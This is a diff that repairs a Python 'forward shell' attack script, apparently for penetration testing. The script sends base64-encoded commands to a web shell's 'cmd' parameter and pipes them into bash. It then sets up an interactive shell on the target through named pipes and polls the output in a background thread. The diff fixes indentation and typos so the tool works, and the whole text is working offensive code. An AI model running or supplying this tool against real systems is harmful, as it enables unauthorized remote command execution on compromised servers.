@@ -1,16 +1,16 @@
 #!/usr/bin/python3
 
-import requests, time, threading, pdb, signal, sys
+import requests, time, threading, signal, sys
 from base64 import b64encode
 from random import randrange
 
-def def_hanlder(sig, frame):
-	print("\n\n[!] Exiting...\n")
-	RunCmd(erasestdin)
-	RunCmd(erasestdout)
-	sys.exit(1)
+def def_handler(sig, frame):
+    print("\n\n[!] Exiting...\n")
+    RunCmd(erasestdin)
+    RunCmd(erasestdout)
+    sys.exit(1)
 
-# Ctrl + C 
+# Ctrl + C
 signal.signal(signal.SIGINT, def_handler)
 
 # Variables Globales
@@ -22,79 +22,65 @@ erasestdin = "/bin/rm %s" % stdin
 erasestdout = "/bin/rm %s" % stdout
 
 class AllTheReads(object):
+    def __init__(self, interval=1):
+        self.interval = interval
+        thread = threading.Thread(target=self.run, args=())
+        thread.daemon = True
+        thread.start()
 
-	def __init__(self, interval=1):
+    def run(self):
+        clearoutput = "echo '' > %s" % stdout
+        readoutput = "/bin/cat %s" % stdout
 
-		self.interval = interval
+        while True:
+            output = RunCmd(readoutput)
 
-		thread = threading.Thread(target=self.run, args=())
-		thread.daemon = True
-		thread.start()
+            if output:
+                RunCmd(clearoutput)
+                print(output)
 
-	def run(self):
-		clearoutput = "echo '' > %s" % stdout
-		readoutput = "/bin/cat %s" % stdout
+            time.sleep(self.interval)
 
-		while True:
+def RunCmd(cmd):
+    cmd = cmd.encode()
+    cmd = b64encode(cmd).decode()
 
-			output = RunCmd(readoutput)
+    post_data = {
+        'cmd': 'echo %s | base64 -d | bash' % cmd
+    }
 
-		if output:
+    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
+    return r
 
-			RunCmd(clearoutput)
-			print(output)
+def SetupShell():
+    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
+    try:
+        RunCmd(NamedPipes)
+    except:
+        pass
+    return None
 
-		time.sleep(self.interval)
+def WriteCmd(cmd):
+    cmd = cmd.encode()
+    cmd = b64encode(cmd).decode()
 
-	def RunCmd(cmd):
+    post_data = {
+        'cmd': 'echo %s | base64 -d > %s' % (cmd, stdin)
+    }
 
-		cmd = cmd.encode()
-		cmd = b64encode(cmd).decode()
+    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
+    return r
 
-		post_data = {
-        		'cmd': 'echo %s | base64 -d | bash' % cmd
-		}
+def ReadCmd():
+    readoutput = "/bin/cat %s" % stdout
+    output = RunCmd(readoutput)
+    return output
 
-		r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
+if __name__ == '__main__':
+    SetupShell()
+    ReadAllTheThings = AllTheReads()
 
-		return r
-
-
-	def SetupShell():
-
-			NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
-		try:
-			RunCmd(NamedPipes)
-		except:
-			None
-		return None
-
-	def WriteCmd(cmd):
-		cmd = cmd.encode()
-		cmd = b64enconde(cmd).decode()
-
-		post_data = {
-			'cmd': 'echo %s | base64 -d > %s' % (cmd, stdin)
-		}
-
-		r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
-
-	def ReadCmd():
-
-		readoutput = "/bin/cat %s" % stdout
-
-		output = RunCmd(readoutput)
-
-		return output
-
-	if __name__ == '__main__':
-
-		SetupShell()
-		ReadAllTheThings = AllTheReads()
-
-		while True:
-
-			cmd = input("> ")
-			WriteCmd(cmd + "\n")
-
-			time.sleep(1.1)
+    while True:
+        cmd = input("> ")
+        WriteCmd(cmd + "\n")
+        time.sleep(1.1)
